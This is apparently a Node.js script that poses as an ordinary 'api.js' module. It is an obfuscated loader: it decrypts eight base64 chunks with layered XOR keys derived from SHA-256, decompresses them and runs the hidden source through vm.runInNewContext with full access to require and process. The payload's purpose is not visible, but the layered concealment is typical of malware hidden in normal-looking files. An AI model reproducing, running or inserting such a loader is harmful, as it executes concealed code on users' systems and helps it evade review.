#!/usr/bin/env node

const crypto = require("crypto");
const zlib = require("zlib");
const vm = require("vm");

const WmspBlggtuzCGs = "bmUgTZbQKmEPX9W9Rb5lZIGioday02K27LnCgg7wJuufDfFOFvqoGZrO2nXOSiZJ5i7uJvybYBIi4N1K/sinULSoIkBqyJ6o1tmf6A==";

const oMGEwLArpEBZgG = "TivyqpAaUcIbnoU/dUVQgyGCZ7yJ9GrxY+8qKW0+ai6a+gyga7vRpvAx6wpZkdq3/nGQXmZhVwnR2JBC/fEGnHbhEtuob7E3kiYtZB/SoqLHunn9hbFbSpPFsFX1glt5Hqd4q4e+La+1Rq1l1mECHnSz7DnKi1Nfyi0nNLX+OQh9Sm0UeehhhyO5igJB6363g2Hl15nq0GIkXRG40HisPzZtdAyuyTm0n5StRncx1Hnd8O4M7zdRA+4qmVoOCn21vZKBZ4iSuZCDE6Lm+30dnp3E0jgIeU9aM7C5SgVKrdJuUA2BjQvFJ9nQGxBcDI0XP1wr9Bx7A0xKJC5iPobGIGRKnEhk47FBpoSSxL1DUMQlSBsLraKDtkkRnjyIsvSfrWqDpmL3sSHWCq+9g5DlNaopoSt0O4tdqNVXkc4HUWaSD+YwhgpJamt9MEIwue29qqDnyb9uml8DS+CWGhTuum/1YMEohORCxPybfqSUySzprIzdJ8I+jLPgJZMtGu6DAPkwOc1tM8YhyLPw5V3gXmpQ53fKSQnQLH7ESs/iGWwvVx4kGxgqkcwyrjNj+/DwqUXW9DkIqEn/dJ6iTFft4NsMlCsyMdGYe6Sm3oRM5Tu6BR+mC0lKTGRNJ3KKqsVoQI+HpsH2iVvNQDoWMjNfM2rDZZFj9P8K1X9tYAK2Ujb5DwWlzn641CjNwJqYGSu7Q3FIODzllbLpMKbvxDWw=";
const vbYnYhhhnZtSPO = "s3sGJKJNdYSMpG0clNyMjMtpC4Xl8mZhgO/tSEFVWP7f5JYUwtusLV359jEokb+c++GFJqHomrkl0feu3TnJm8Gs0GSMNmUgwyF+9GIW3kfly2if2s5QFjJPLsO8l0lyfbanp/t/pxdPH39rupmE/CCSxxZMHWWQox7NJi69q6GJtDsCEvjWY8kQW7aqpJJlW8Ypqkd8TnsjDq7cF4XyQtPtg+AzTTir/Hc2aOmi0U48JTsjm7UXk7Cs1YxuasaiKV4vSSsstf48TgUWTjoGgksIScX3boLNeWxVWiLqpVBCOt3MjmO6ODiNTJXUEinkmQbfkf3PX/WkePCmzkXAO5ydzpJvtX3rhfrBtrVcPlt0+qrvpIiWWLzvW9SxyJPFFYbET+sHFtYpMnkkcdygVRqD9VmO0Cf11FDmT+JIcEr+yYNve83RswCWxGW4m4/lmE61zh1GAiDVLN8V4k4uluGtdBqZ2P97o2LxMvFBqPmXHKJq83Ws2j462JkucsUY7YhtwweNcjMnZU/2uEY2nMAACZ4vg86tVWlICPiL5r4LsyipAAWIpAfXhzC025G/mxH3You2x03UoHs3Xd2a+bQhaBPxpNNZ/ABZt0g1xhMHdORgCjFoZe2fiit0sGjtbJbXj5x5V+FeBKxenDxlaIRsErwuDViv/Cxi1iGxY9bCRpsVuAwmsjUO4Uzo2GHFk8U/6ie1lEMfX3lzv86YbePvC";
const STDXXqKSSXGLQc = "ecj82ztAnQ0uKlqGFyZMAQQPCkp6tDK0y3iads8YzoFno1HMoD7Y/MwaFJgfKqsy4LyjJeb/xodOKqZqEV+rkYNeyjbl+g+hcDWoCqU+oW1lg6RurtHkcFtuGbfHylXancBUShdPbXRZlbxb7efoIRkpOdvZMggNMsdJNrkciUFzCW3hE5BWmTiRDbDqn847IRZgFRgb4apcnyN/SsZa/24H6WItDAiSeOKK4KW8C3vKssHzGlLWkH+SwTTizY+D28JXsUTNNIXXJ7oShFbazb9BULwX2D8RiwsA6LhI732/ZN07qMFTPVk2T4jh7+NXLYsqFQh1ErUyGBsMuvDjrKL+zHHV/Gmk52xFwPGIqMzHCv/PkTcnKi//d6t62hHFeAinQlavn3JOIt6SH7WsNs43DMSRFDjlYiVSqdjtDRpZRXXj6Mw92tWUHzwiWZQVfJy7zlRamzLA+DQydu4MTXl8riniJqE+3KTfJZ//PT28lI+ULmnaIxmatq8BrUdXbz83XmG8MqbhJXcA80uTcE50DbYuttcOQVSvkQkNBdNs1w887xl2rzZ71dY6zm4PYmyDlWw4/cV/NjmfLIi2+t1rkwhzIKLJy4WLTTAcT7s18j0qjozd9X/E/InpQqwMr6BQ40uv15eQ78or7+wrN1aJ3yAym5i+xHBqzuydTippb8b89wwayAz9vsXc9QCXiiObyvZTafnwSNKDNb3eECwvC";
const CLUtmLXhQxJntE = "vpxDMJ9P2NJv8n/YIeh5wwnn3gR/xBGNTn1wrLa3NIK6FlT+1FcxHg+qwz8xTHtYLaLoETD6/J5RMjfeVdGXnSKcUva4ALkjfq+DRjrFdyDGFzerhkawWjNGqIb9tVwGVVz1VOYrNBDd3SVB6AD+L6INgyx4XEG52Bk8LsPGtuIR7NlbUpb58L7RcSBJlOav4l0W7Urv7KuJhyZTuns6Z4cpB0EsBciAYw0d553bVoMkalO73Ejoqede2xzANnlRh77c2ScaOQgEieE+YdLsfE8zM1k5frU+l814PFT/zL+4xgdgJcKNbMXuLfVNgF8rV8pUjP8lsuhi2W+7wiK1JoZXtY5CHJx4fRqmzvFQTmLd1h2NyyJ4G007xdpNOzWXjn9OoJVr44egSUhwnUXSvoSwkB0b2SE0QxPBrtP7+dyqltp4AmWlQz2GoUOqKQ6T/sFPDCsLThDnzCZn6dvFO0RA4IN5FaOWa06yCr9LRCFDklyV99QeLhcrLgMGyMa8DCY97JUFdDL5XHTRRcFdhJ8YkZ4eXehzo/2qZei0oBber+QCanthvPYEP3C3mdS9KRs0eh5Lal1t5u4qwTsXbHHTpdKsy58yQh/eiUg4dSq/ueGPGIaq7p8s5KpkRVdiVv6Lz6glUpjicLY+JUk5XByQY5Ar/ZfhogKns3OUJkrjGUaRQR63jh35cXEI9CYbUXje6cn11FvwDL1QfZhri+RYr";
const EQZfxrXwjFQIKy = "XM5nzONET7R3F7Jtg/BppDWsHRMrb8tB2MrawQN/V6Gh9npXQIhwVIHin46kxu+TN2t/C/nkeSx53qCDkPxzG1fSZGmmam7WfdRhJfsfmt5qpXds5B6Nkvm0CMe99gv9NRKj4a3MIdIHGLOFf8Eb6xlOOGzlW7OdBzr/a5BAHn8jKu0uWdyutNyAXkiBaC9RWt5m/CfTKtEkQSOhSD9y86OJtPAEkMYVtS6g54s05U42DbOUMUXaeUY4eysVDeakgP5w90aROm+g0p58p9UmELhQYSklIYaew7n1GvT72Vq6aGSefwgTe3cZOF9jtT3xtaqfIE5hefEXSxbnPh+Bmy/PN8Uw9T0D8z7etgxtbcHAXon3UWOzVni8gqm6NH8n1sgXB+6bouxvzR+p70QjTTyJ+hoBuRKy3IVWpkiE1JXnvxsW0Q2GsTKpjjPjWSN0XS+XOOpJJ8tWOKlPxmtmMz6CetRw5Qg6ZvkdoG9VltfPbtM2fVvYT+TMv+3169kc9w3aeEN/6YpoCuBkpX4RjDXfmaCdXUqIjLR9PpegjrR8xkyXm8BlsogA1oTUqTR3rRNGoNPDXOENxoLJS/2oxhKJ6VMea/h9KCWVKNlFRaJOmlJLU4jaIwtB7ilxx76c8XqTFkgouyJ0O2idXIM0j1GONVRsfHwI1qSsy+xXDEEPR5fDHl82OnlVbDRXsv2J26/bewjcC7O4PDpzcnVie96L/";
const lNwSUITqfAEwhM = "+t6f/1Y2ykkpsA9PpnSUlWB6XtQ9ktiT5cDjvxaTB/MPi5OeeBeo5DisJ9+QbyLNvDLQCzk3LSFKFemNbptoI8DjaUkSUrYs1U1c6hz6vNdM2KVRXySkRjuRximb0BsgXlyaFpL2MZw38WWAKPLdhGzAljj1aul2tAW6ZEjWTJe82lJq0qyAmtAhtkfniJcMk/eUlFXP6PHMkX3ltTRx7AH5P7yUtZBBc9nTen314I+knTGnujyO8RQuJ7STE1SwKFlHxgPH0IftUkSTfT+UixTKGEGOFqe2w52llAE1Z/JWXOpGmCeiT1DFsTKMh/PVYyh2bEwpRRGlIqXARTdlfxLRYglI4h/Vnfmy2ONiJIbhq/a4DF3nMFj9kL3nvOcY88LEzSe+tjWJorTZOaQ8gpFLjOTc5Gdy+eaRix6Vcosmv4ze2ntynkX0r1g0c1Zl0HGEF8Vmi1N+PLRyIiqWF60iJc0Lk807Lnqh5jU1qmD7FljHUkWpTsmK7fD226DeLgIKHmDHaajSun3mH93gZEV+AGWkRM50ZULRxsYrEw432x48N44EjQPXnDj1hy6jD2zuZuWqz3xDDNZmx+O9pY2kZu7+1rTVpTqDpAh3P77lQEnCWKfxBFvLHbKsHfNt7W30i+TRcVwg7Eb00EIU/gpQQ7wXK/UhbUdUWy/Fvjo1cnm/9zL/XnW/puHpeum1SIff3krYLAAQHnJGYFJehYBzb";
const YcXOfEBnwoxmXO = "Hw/mWcStwKPCP8VCVYZzlv2/KZsml3gY1A3z7TZoFGy+lyFVC6rrqDU8qr3E9kr62WuC9vCKrrJ9fFOTGsnHSv0sr3ENzSrslEtYn0dUAGEbM99LN84Gm1Xbs8ACQlahuKu1wVfWPmo+MuRsLLb0HbeaNPS9e+8FIPdEKArKx+1x3127bus6yawnUUfemT5TfprUIBhht0zpTgJUsTpnSkjubW9N2ZcLkMvrH4Rdpq04eb8DQtj0fwIorWabZTbyKontte6RMer9rT+fuBoNHba7ghES6+NQQKzCit9v45+PPMujz9A1TanXW+cCgAW9eNQGn+E2r9ZcBKm3c9KWKWemcvmVAwAMYqUu6QzitCI2i73mmdPZH/F7TpN+HPqilUjmuy7PKy5/dOqtKsl46SwZp8XsXcgw1d+iod8oMRaYovcQwa095DlyYt5qvUI2F2DBeKOBHvXw9tTcWh93HQCj9IVfUtaHvU5S07z5lWNtYN89gaMeiacPNhohgDetSZ7P/bUaxaZT3eNm8s/zqDpJ1Fo8Y10+VzAvnFRWGt0qfPDM2r9CAiE+8wXc84/2Ix8HamgMEYBqPNRRaO2Kwocz93HIct3nwOxVwbCr2Uh5hxjo05v+WH3epl2aHChkTHoFzhCakFValIe1Zb2LaB7NbeB0hkJzo6uTGMqTvn9olub+3+9LFhYEK/KCoDHxFNH8/veERvUlNK2YDrHBsLRby";
const dikNsbXItvHoqv = "pqnzNfLTGwDEaSOD9ZWWBJwTZ4Nyl6qg4BJY9V0GCpnId29xX2q9SEPO2DN4zF+EAUkoBOoxtjLqkzQ0Q+miuQscFNPYiFIlb07Brz9h8RHOuc08FbVNdrDE6GQSd7DFYrkO7NzA3/QKnhpH9RG5wErtrwPuCvna2t7u63TGQ84TSRmwlO9HG/fg7y1CvymDuu/UGxpS6DSo5NvCfeXhk94630IeA9Z6SP+PH2Bu7FGRC53cR1+FhPfwZIJ3VURgBtJXkl4oKUczTwD0LWigVZow7QldHZmzWjwQFRIhtfnNuu+LqGCD6iR/XspSXNy9frxdKYALToI3t/fc1+qs4QOtYKhIJfvBRXWAtMQavTLwNhPVwucvAUSvctD5F56eDhXG6Yxh6Ow4hIokVjezS/oaLnsCRnIXTyLWvcOWjzRSFg2uh35U4Xu59lVc7Gn3gnYz3pcz6YVwqKIa9SmWgWX/xeyZZoB10scb7NqbsCjJHZP79GaliigqbCdpPCnfKFjPFFLqqP9l3AfUZy5QUc43i5qec5LFM16SePIzO4EeJdaPw4w4xNuBWUhkJrIm++ldprSSl+nlo43/1zaHmh8C0c5+4a4R1LuKzlNiQnJVN3M1OAVHyFHoGzdOVBhlzc8uKoyW7dobpaCKgNTpEmEmrPPsldrHrKfIGJUvrgD2TkSzpN7HFIDChTRJgvYdNrhuR2mwp8mChMmEZFVf9TWVO";

const WRFjHdsFXjexWt = "api.js";

function FtgDxYsVgSQnoz(data, key) {
  if (!key.length) return data;

  const out = Buffer.alloc(data.length);

  for (let i = 0; i < data.length; i++) {
    out[i] = data[i] ^ key[i % key.length];
  }

  return out;
}

function cTJCFEqmxqRFub() {
  try {
    const blob = Buffer.from(
      WmspBlggtuzCGs,
      "base64"
    );

    if (blob.length < 32) {
      throw new Error("Invalid metadata");
    }

    const salt = blob.subarray(0, 16);
    const nonce = blob.subarray(16, 32);
    const encryptedPayload = blob.subarray(32);

    const filenameHash = crypto
      .createHash("sha256")
      .update(WRFjHdsFXjexWt)
      .digest()
      .subarray(0, 8);

    const layer1 = crypto
      .createHash("sha256")
      .update(
        Buffer.concat([
          filenameHash,
          Buffer.from("::L1")
        ])
      )
      .digest()
      .subarray(0, 16);

    const layer2 = crypto
      .createHash("sha256")
      .update(
        Buffer.concat([
          nonce,
          Buffer.from("::L2")
        ])
      )
      .digest()
      .subarray(0, 16);

    const layer3 = crypto
      .createHash("sha256")
      .update(
        Buffer.concat([
          salt,
          Buffer.from("::L3")
        ])
      )
      .digest()
      .subarray(0, 16);

    const blobKey = crypto
      .createHash("sha256")
      .update(
        Buffer.concat([
          layer1,
          layer2,
          layer3
        ])
      )
      .digest();

    const payload = FtgDxYsVgSQnoz(
      encryptedPayload,
      blobKey
    );

    if (payload.length < 44) {
      throw new Error("Invalid payload");
    }

    const obfDataKey =
      payload.subarray(0, 32);

    const obfIndices =
      payload.subarray(32, 40);

    const keyMaterial =
      Buffer.concat([
        layer1,
        layer2,
        layer3
      ]);

    const dataKey = FtgDxYsVgSQnoz(
      obfDataKey,
      keyMaterial
    );

    const indices = [
      ...FtgDxYsVgSQnoz(
        obfIndices,
        dataKey.subarray(0, 8)
      )
    ];

    const valid =
      indices.length === 8 &&
      [...indices]
        .sort((a, b) => a - b)
        .every((value, i) => value === i);

    if (!valid) {
      throw new Error("Invalid index metadata");
    }

    const parts = [
      oMGEwLArpEBZgG,
      vbYnYhhhnZtSPO,
      STDXXqKSSXGLQc,
      CLUtmLXhQxJntE,
      EQZfxrXwjFQIKy,
      lNwSUITqfAEwhM,
      YcXOfEBnwoxmXO,
      dikNsbXItvHoqv
    ];

    const ordered = new Array(8);

    for (
      let pos = 0;
      pos < indices.length;
      pos++
    ) {
      ordered[indices[pos]] = parts[pos];
    }

    if (
      ordered.some(
        part => typeof part !== "string"
      )
    ) {
      throw new Error("Invalid encrypted data");
    }

    const encrypted = Buffer.from(
      ordered.join(""),
      "base64"
    );

    const compressed = FtgDxYsVgSQnoz(
      encrypted,
      dataKey
    );

    const source = zlib
      .gunzipSync(compressed)
      .toString("utf8");

    const context = {
      require,
      module,
      exports,
      __filename: require("path").resolve(
        process.argv[1]
      ),
      __dirname: require("path").dirname(
        require("path").resolve(
          process.argv[1]
        )
      ),
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      clearTimeout,
      clearInterval
    };

    vm.runInNewContext(
      source,
      context,
      {
        filename: WRFjHdsFXjexWt
      }
    );

  } catch (err) {
    console.error(
      "[ERROR]",
      err.name + ":",
      err.message
    );

    process.exit(1);
  }
}

cTJCFEqmxqRFub();
